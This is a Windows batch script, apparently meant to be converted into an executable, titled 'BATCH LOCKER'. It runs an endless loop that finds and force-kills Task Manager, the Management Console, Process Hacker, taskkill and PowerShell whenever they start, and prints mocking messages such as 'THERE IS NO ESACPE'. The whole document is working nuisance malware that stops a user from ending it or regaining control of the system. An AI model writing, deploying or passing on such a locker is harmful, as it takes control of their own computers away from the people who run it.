::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSjk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDxBQzyLMleeA6YX/Ofr0/uQs3ETX/Q2aprI5oe7E64W8kCE
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
title BATCH LOCKER
echo THERE IS NO ESACPE HAHAHA

:taskkillr
set "kill=none"
tasklist /fi "ImageName eq taskmgr.exe" /fo csv 2>NUL | find /I "taskmgr.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=taskmgr"

tasklist /fi "ImageName eq mmc.exe" /fo csv 2>NUL | find /I "mmc.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=mmc"

tasklist /fi "ImageName eq ProcessHacker.exe" /fo csv 2>NUL | find /I "ProcessHacker.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=PH"

tasklist /fi "ImageName eq taskkill.exe" /fo csv 2>NUL | find /I "taskkill.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=taskkill"

tasklist /fi "ImageName eq powershell.exe" /fo csv 2>NUL | find /I "powershell.exe">NUL
if "%ERRORLEVEL%"=="0" set "kill=pwsh"


if %kill%==none (
goto taskkillr 
) else (
if %kill%==taskmgr taskkill /f /im taskmgr.exe /t > nul &  echo NO task manager for you :D & goto taskkillr
if %kill%==mmc taskkill /f /im mmc.exe /t > nul & echo NO Management Console for you :D & goto taskkillr
if %kill%==PH taskkill /f /im ProcessHacker.exe /t > nul & echo NO Process Hacker for you :D & goto taskkillr
if %kill%==taskkill taskkill /f /im taskkill.exe /t > nul & echo NO taskkill for you :D & goto taskkillr
if %kill%==pwsh taskkill /f /im powershell.exe /t > nul & echo NO Powershell for you :D & goto taskkillr

)

goto taskkillr